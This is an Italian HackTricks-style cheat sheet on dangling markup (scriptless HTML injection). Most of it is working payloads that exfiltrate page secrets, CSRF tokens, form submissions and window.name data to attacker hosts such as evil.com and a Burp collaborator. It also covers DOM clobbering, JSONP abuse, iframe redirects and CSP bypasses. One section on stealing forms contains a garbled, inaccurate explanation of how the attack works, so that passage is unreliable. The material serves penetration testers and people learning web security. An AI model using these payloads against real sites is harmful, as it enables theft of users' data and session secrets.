# Dangling Markup - Iniezione HTML senza script

<details>

<summary><strong>Impara l'hacking di AWS da zero a esperto con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Altri modi per supportare HackTricks:

* Se vuoi vedere la tua **azienda pubblicizzata su HackTricks** o **scaricare HackTricks in PDF** Controlla i [**PACCHETTI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
* Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
* Scopri [**The PEASS Family**](https://opensea.io/collection/the-peass-family), la nostra collezione di [**NFT esclusivi**](https://opensea.io/collection/the-peass-family)
* **Unisciti al** üí¨ [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo Telegram**](https://t.me/peass) o **seguici** su **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Condividi i tuoi trucchi di hacking inviando PR a** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

## Riassunto

Questa tecnica pu√≤ essere utilizzata per estrarre informazioni da un utente quando viene trovata un'**iniezione HTML**. Questo √® molto utile se **non riesci a trovare un modo per sfruttare un** [**XSS** ](../xss-cross-site-scripting/)ma puoi **iniettare alcuni tag HTML**.\
√à anche utile se qualche **segreto √® salvato in chiaro** nell'HTML e vuoi **esfiltrarlo** dal client, o se vuoi ingannare l'esecuzione di uno script.

Diverse tecniche commentate qui possono essere utilizzate per aggirare alcune [**Content Security Policy**](../content-security-policy-csp-bypass/) esfiltrando informazioni in modi inaspettati (tag html, CSS, http-meta tags, forms, base...).

## Principali Applicazioni

### Rubare segreti in chiaro

Se inietti `<img src='http://evil.com/log.cgi?` quando la pagina viene caricata, la vittima ti invier√† tutto il codice tra il tag `img` iniettato e la successiva virgoletta all'interno del codice. Se un segreto √® in qualche modo presente in quel frammento, lo ruberai (puoi fare la stessa cosa usando un doppio apice, guarda quale potrebbe essere pi√π interessante da usare).

Se il tag `img` √® vietato (ad esempio a causa di CSP) puoi anche usare `<meta http-equiv="refresh" content="4; URL='http://evil.com/log.cgi?`
```html
<img src='http://attacker.com/log.php?HTML=
<meta http-equiv="refresh" content='0; url=http://evil.com/log.php?text=
<meta http-equiv="refresh" content='0;URL=ftp://evil.com?a=
```
Nota che **Chrome blocca gli URL HTTP** con "<" o "\n" al loro interno, quindi potresti provare altri schemi di protocollo come "ftp".

Puoi anche sfruttare l'importazione CSS `@import` (invier√† tutto il codice fino a quando non trova un ";")
```html
<style>@import//hackvertor.co.uk?     <--- Injected
<b>steal me!</b>;
```
Potresti anche utilizzare **`<table`**:
```html
<table background='//your-collaborator-id.burpcollaborator.net?'
```
√à anche possibile inserire un tag `<base`. Tutte le informazioni verranno inviate fino alla chiusura delle virgolette, ma richiede un'interazione dell'utente (l'utente deve fare clic su un link, perch√© il tag base avr√† cambiato il dominio puntato dal link):
```html
<base target='        <--- Injected
steal me'<b>test</b>
```
### Rubare moduli

In alcuni casi, √® possibile sfruttare una vulnerabilit√† di iniezione di markup HTML senza script per rubare i dati inseriti in un modulo da parte degli utenti. Questa tecnica sfrutta il fatto che il markup HTML pu√≤ essere interpretato anche se non √® all'interno di un tag valido.

Per eseguire questo attacco, √® necessario individuare un punto vulnerabile nel sito web in cui √® possibile inserire del markup HTML non valido. Questo pu√≤ essere fatto ad esempio attraverso campi di input non adeguatamente sanificati o filtri di input insufficienti.

Una volta individuato il punto vulnerabile, √® possibile inserire del markup HTML non valido che includa un tag di chiusura per il tag del modulo desiderato. In questo modo, il browser interpreter√† tutto il markup HTML successivo come parte del modulo.

Quando un utente inserisce i propri dati nel modulo e li invia, il browser invier√† anche i dati al server. Tuttavia, poich√© il markup HTML non valido √® stato inserito, il browser invier√† anche i dati al punto vulnerabile. In questo modo, √® possibile rubare i dati inseriti dagli utenti.

Per prevenire questo tipo di attacco, √® fondamentale implementare adeguati controlli di validazione e sanitizzazione dei dati di input. Inoltre, √® consigliabile utilizzare librerie o framework che offrano funzionalit√† di protezione contro attacchi di iniezione di markup HTML.
```html
<base href='http://evil.com/'>
```
Quindi, i moduli che inviano dati al percorso (come `<form action='update_profile.php'>`) invieranno i dati al dominio malevolo.

### Rubare moduli 2

Imposta un'intestazione del modulo: `<form action='http://evil.com/log_steal'>` questo sovrascriver√† l'intestazione del modulo successivo e tutti i dati del modulo saranno inviati all'attaccante.

### Rubare moduli 3

Il pulsante pu√≤ cambiare l'URL a cui verranno inviate le informazioni del modulo con l'attributo "formaction":
```html
<button name=xss type=submit formaction='https://google.com'>I get consumed!
```
Un attaccante pu√≤ utilizzare questo per rubare le informazioni.

### Rubare segreti in testo normale 2

Utilizzando l'ultima tecnica menzionata per rubare i form (iniettando un nuovo header del form) √® possibile iniettare un nuovo campo di input:
```html
<input type='hidden' name='review_body' value="
```
e questo campo di input conterr√† tutto il contenuto tra le sue virgolette doppie e le virgolette doppie successive nell'HTML. Questo attacco combina "_**Rubare segreti in testo chiaro**_" con "_**Rubare form2**_".

Puoi fare la stessa cosa iniettando un modulo e un tag `<option>`. Tutti i dati fino a quando viene trovato un `</option>` chiuso saranno inviati:
```html
<form action=http://google.com><input type="submit">Click Me</input><select name=xss><option
```
### Iniezione di parametri del modulo

√à possibile modificare il percorso di un modulo e inserire nuovi valori in modo che venga eseguita un'azione inaspettata:
```html
<form action='/change_settings.php'>
<input type='hidden' name='invite_user'
value='fredmbogo'>                                        ‚Üê Injected lines

<form action="/change_settings.php">                        ‚Üê Existing form (ignored by the parser)
...
<input type="text" name="invite_user" value="">             ‚Üê Subverted field
...
<input type="hidden" name="xsrf_token" value="12345">
...
</form>
```
### Rubare segreti in testo normale tramite noscript

`<noscript></noscript>` √® un tag il cui contenuto verr√† interpretato se il browser non supporta JavaScript (puoi abilitare/disabilitare JavaScript in Chrome su [chrome://settings/content/javascript](chrome://settings/content/javascript)).

Un modo per esfiltrare il contenuto della pagina web dal punto di iniezione fino alla fine verso un sito controllato dall'attaccante sar√† iniettare questo:
```html
<noscript><form action=http://evil.com><input type=submit style="position:absolute;left:0;top:0;width:100%;height:100%;" type=submit value=""><textarea name=contents></noscript>
```
### Bypassare CSP con interazione dell'utente

Da questa [ricerca di portswiggers](https://portswigger.net/research/evading-csp-with-dom-based-dangling-markup) √® possibile apprendere che anche negli ambienti **pi√π restrittivi CSP** √® ancora possibile **esfiltrare dati** con un po' di **interazione dell'utente**. In questa occasione useremo il payload:
```html
<a href=http://attacker.net/payload.html><font size=100 color=red>You must click me</font></a>
<base target='
```
Nota che chiederai alla **vittima** di **cliccare su un link** che lo **reindirizzer√†** a un **payload** controllato da te. Nota anche che l'attributo **`target`** all'interno del tag **`base`** conterr√† **contenuto HTML** fino al prossimo singolo apice.\
Ci√≤ far√† s√¨ che il **valore** di **`window.name`** quando il link viene cliccato sar√† tutto quel **contenuto HTML**. Pertanto, poich√© **controlli la pagina** a cui la vittima accede cliccando sul link, puoi accedere a quel **`window.name`** ed **esfiltrare** quei dati:
```html
<script>
if(window.name) {
new Image().src='//your-collaborator-id.burpcollaborator.net?'+encodeURIComponent(window.name);
</script>
```
### Flusso di script fuorviante 1 - Attacco al namespace HTML

Inserisci un nuovo tag con un id all'interno dell'HTML che sovrascriver√† il successivo e con un valore che influenzer√† il flusso di uno script. In questo esempio stai selezionando con chi verranno condivise le informazioni:
```html
<input type='hidden' id='share_with' value='fredmbogo'>     ‚Üê Injected markup
...
Share this status update with:                              ‚Üê Legitimate optional element of a dialog
<input id='share_with' value=''>

...

function submit_status_update() {
...
request.share_with = document.getElementById('share_with').value;
...
}
```
### Flusso di script fuorviante 2 - Attacco allo spazio dei nomi dello script

Crea variabili all'interno dello spazio dei nomi javascript inserendo tag HTML. Successivamente, questa variabile influenzer√† il flusso dell'applicazione:
```html
<img id='is_public'>                                        ‚Üê Injected markup

...

// Legitimate application code follows

function retrieve_acls() {
...
if (response.access_mode == AM_PUBLIC)                    ‚Üê The subsequent assignment fails in IE
is_public = true;
else
is_public = false;
}

function submit_new_acls() {
...
if (is_public) request.access_mode = AM_PUBLIC;           ‚Üê Condition always evaluates to true
...
}
```
### Abuso di JSONP

Se trovi un'interfaccia JSONP potresti essere in grado di chiamare una funzione arbitraria con dati arbitrari:
```html
<script src='/editor/sharing.js'>:              ‚Üê Legitimate script
function set_sharing(public) {
if (public) request.access_mode = AM_PUBLIC;
else request.access_mode = AM_PRIVATE;
...
}

<script src='/search?q=a&call=set_sharing'>:    ‚Üê Injected JSONP call
set_sharing({ ... })
```
Oppure puoi provare ad eseguire del codice JavaScript:
```html
<script src='/search?q=a&call=alert(1)'></script>
```
### Abuso di Iframe

Un documento figlio ha la capacit√† di visualizzare e modificare la propriet√† `location` del suo genitore, anche in situazioni di cross-origin. Ci√≤ consente l'incorporazione di uno script all'interno di un **iframe** che pu√≤ reindirizzare il client a una pagina arbitraria:
```html
<html><head></head><body><script>top.window.location = "https://attacker.com/hacked.html"</script></body></html>
```
Questo pu√≤ essere mitigato con qualcosa del genere: `sandbox=' allow-scripts allow-top-navigation'`

Un iframe pu√≤ anche essere utilizzato per rivelare informazioni sensibili da una pagina diversa **utilizzando l'attributo name dell'iframe**. Questo perch√© √® possibile creare un iframe che si inframezza da solo sfruttando l'iniezione HTML che fa apparire le **informazioni sensibili all'interno dell'attributo name dell'iframe** e quindi accedere a quel nome dall'iframe iniziale e rivelarlo.
```html
<script>
function cspBypass(win) {
win[0].location = 'about:blank';
setTimeout(()=>alert(win[0].name), 500);
}
</script>

<iframe src="//subdomain1.portswigger-labs.net/bypassing-csp-with-dangling-iframes/target.php?email=%22><iframe name=%27" onload="cspBypass(this.contentWindow)"></iframe>
```
Per ulteriori informazioni, consulta [https://portswigger.net/research/bypassing-csp-with-dangling-iframes](https://portswigger.net/research/bypassing-csp-with-dangling-iframes)

### \<meta abuso

Puoi utilizzare **`meta http-equiv`** per eseguire **diverse azioni** come impostare un Cookie: `<meta http-equiv="Set-Cookie" Content="SESSID=1">` o eseguire un reindirizzamento (in questo caso, dopo 5 secondi): `<meta name="language" content="5;http://attacker.svg" HTTP-EQUIV="refresh" />`

Questo pu√≤ essere **evitato** con una **CSP** relativa a **http-equiv** (`Content-Security-Policy: default-src 'self';`, o `Content-Security-Policy: http-equiv 'self';`)

### Nuovo tag HTML \<portal

Puoi trovare una ricerca molto **interessante** sulle vulnerabilit√† sfruttabili del tag \<portal [qui](https://research.securitum.com/security-analysis-of-portal-element/).\
Al momento della stesura di questo testo, √® necessario abilitare il tag portal su Chrome in `chrome://flags/#enable-portals` o non funzioner√†.
```html
<portal src='https://attacker-server?
```
### Falle HTML

Non tutti i modi per rivelare la connettivit√† in HTML saranno utili per il Dangling Markup, ma a volte potrebbero essere d'aiuto. Controllali qui: [https://github.com/cure53/HTTPLeaks/blob/master/leak.html](https://github.com/cure53/HTTPLeaks/blob/master/leak.html)

## SS-Leaks

Questo √® un **mix** tra **dangling markup e XS-Leaks**. Da un lato, la vulnerabilit√† consente di **iniettare HTML** (ma non JS) in una pagina della **stessa origine** di quella che attaccheremo. Dall'altro lato, non attaccheremo direttamente la pagina in cui possiamo iniettare HTML, ma **un'altra pagina**.

{% content-ref url="ss-leaks.md" %}
[ss-leaks.md](ss-leaks.md)
{% endcontent-ref %}

## XS-Search/XS-Leaks

XS-Search √® orientato a **esfiltrare informazioni cross-origin** sfruttando **attacchi a canali secondari**. Pertanto, √® una tecnica diversa dal Dangling Markup, tuttavia, alcune delle tecniche sfruttano l'inclusione di tag HTML (con e senza esecuzione di JS), come l'**iniezione di CSS** o il **caricamento pigro delle immagini**.

{% content-ref url="../xs-search.md" %}
[xs-search.md](../xs-search.md)
{% endcontent-ref %}

## Elenco di rilevamento Brute-Force

{% embed url="https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/dangling_markup.txt" %}

## Riferimenti

* [https://aswingovind.medium.com/content-spoofing-yes-html-injection-39611d9a4057](https://aswingovind.medium.com/content-spoofing-yes-html-injection-39611d9a4057)
* [http://lcamtuf.coredump.cx/postxss/](http://lcamtuf.coredump.cx/postxss/)
* [http://www.thespanner.co.uk/2011/12/21/html-scriptless-attacks/](http://www.thespanner.co.uk/2011/12/21/html-scriptless-attacks/)
* [https://portswigger.net/research/evading-csp-with-dom-based-dangling-markup](https://portswigger.net/research/evading-csp-with-dom-based-dangling-markup)

<details>

<summary><strong>Impara l'hacking di AWS da zero a eroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Altri modi per supportare HackTricks:

* Se vuoi vedere la tua **azienda pubblicizzata in HackTricks** o **scaricare HackTricks in PDF**, controlla i [**PACCHETTI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
* Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
* Scopri [**The PEASS Family**](https://opensea.io/collection/the-peass-family), la nostra collezione di esclusive [**NFT**](https://opensea.io/collection/the-peass-family)
* **Unisciti al** üí¨ [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo Telegram**](https://t.me/peass) o **seguici** su **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Condividi i tuoi trucchi di hacking inviando PR ai repository github di** [**HackTricks**](https://github.com/carlospolop/hacktricks) **e** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
